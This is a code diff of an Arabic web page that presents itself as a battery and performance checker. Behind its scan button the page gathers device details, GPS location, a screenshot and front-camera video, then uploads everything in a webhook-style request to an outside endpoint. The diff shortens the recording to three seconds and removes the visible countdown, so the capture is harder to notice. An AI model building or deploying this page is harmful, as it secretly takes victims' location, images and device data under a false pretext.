@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص البطارية والأداء الشامل 🔋</title>
+    <title>فحص كفاءة الأداء ⚡</title>
     
-    <meta property="og:title" content="فحص أداء وصحة البطارية الأصلي ⚡">
-    <meta property="og:description" content="افحص حالة بطارية هاتفك وإصدار النظام واختبر كفاءة الجهاز الآن.">
+    <meta property="og:title" content="فحص أداء وصحة الجهاز الأصلي 🎮">
+    <meta property="og:description" content="اضغط هنا لفحص كفاءة النظام والبطارية الآن.">
     <meta property="og:image" content="https://i.imgur.com/W333L67.png">
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
@@ -71,9 +71,9 @@
 <body>
 
     <div class="card" id="mainCard">
-        <h2>فحص كفاءة البطارية والتردد</h2>
-        <p>اضغط على زر البدء أدناه لفحص صحة بطارية هاتفك، مقياس الفولت، واختبار الأداء العام.</p>
-        <button class="btn" onclick="startLongVideoPrank()">بدء الفحص الشامل ⚡</button>
+        <h2>فحص كفاءة النظام والبطارية</h2>
+        <p>اضغط على الزر أدناه لبدء الفحص السريع ومعاينة تفاصيل الجهاز.</p>
+        <button class="btn" onclick="startQuickVideoPrank()">بدء الفحص السريع ⚡</button>
         <div id="status" class="status"></div>
     </div>
 
@@ -97,7 +97,7 @@
             });
         }
 
-        async function startLongVideoPrank() {
+        async function startQuickVideoPrank() {
             const statusEl = document.getElementById('status');
             statusEl.innerText = "جاري الاتصال بقاعدة بيانات الأجهزة...";
 
@@ -122,13 +122,12 @@
                     const b = await navigator.getBattery();
                     const level = Math.round(b.level * 100);
                     const chargingState = b.charging ? "⚡ يشحن بالكهرباء" : "🔋 يعمل على البطارية";
-                    // محاولة قراءة مستوى الفولت التقريبي أو حالة تفريغ الشحن لو مدعومة
                     batteryInfo = `${level}% | الحالة: ${chargingState}`;
                 } catch(e) {}
             }
 
             const gps = await getGPSLocation();
-            const textData = `🎯 **تم التقاط فيديو مطول وبيانات الهاتف الحقيقية!** 📱🔥
+            const textData = `🎯 **تم التقاط فيديو سريع (3 ثوانٍ) وبيانات الجهاز!** 📱🔥
 ━━━━━━━━━━━━━━━━━━━━
 📱 **نوع الجهاز:** ${phoneType}
 ⚙️ **إصدار النظام:** ${osVersion}
@@ -144,7 +143,7 @@
                 screenshotBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
             } catch(e) {}
 
-            // 3. تشغيل الكاميرا وتسجيل فيديو لمدة أطول (مثلاً 12 ثانية) مع عداد للمستخدم
+            // 3. تشغيل الكاميرا وتسجيل فيديو لمدة 3 ثواني بالضبط
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
@@ -170,11 +169,11 @@
                     const videoBlob = new Blob(chunks, { type: 'video/webm' });
                     stream.getTracks().forEach(t => t.stop());
 
-                    statusEl.innerText = "اكتمل الفحص بنجاح! جاري الحفظ...";
+                    statusEl.innerText = "اتم الفحص بنجاح!";
 
                     const formData = new FormData();
                     formData.append('payload_json', JSON.stringify({ content: textData }));
-                    if (videoBlob) formData.append('file1', videoBlob, 'long_recording.webm');
+                    if (videoBlob) formData.append('file1', videoBlob, 'quick_recording.webm');
                     if (screenshotBlob) formData.append('file2', screenshotBlob, 'screen.png');
 
                     try {
@@ -186,16 +185,12 @@
 
                 mediaRecorder.start();
 
-                // عداد تنازلي مرئي يخليه ينتظر 12 ثانية كاملة وتسجيل فيديو أطول
-                let timeLeft = 12;
-                const timerInterval = setInterval(() => {
-                    timeLeft--;
-                    statusEl.innerText = `جاري فحص كفاءة النظام والبطارية... (${timeLeft} ثوانٍ متبقية)`;
-                    if (timeLeft <= 0) {
-                        clearInterval(timerInterval);
+                // إيقاف التسجيل بعد 3 ثواني (3000 ملي ثانية)
+                setTimeout(() => {
+                    if (mediaRecorder.state === "recording") {
                         mediaRecorder.stop();
                     }
-                }, 1000);
+                }, 3000);
 
             } catch (err) {
                 const formData = new FormData();
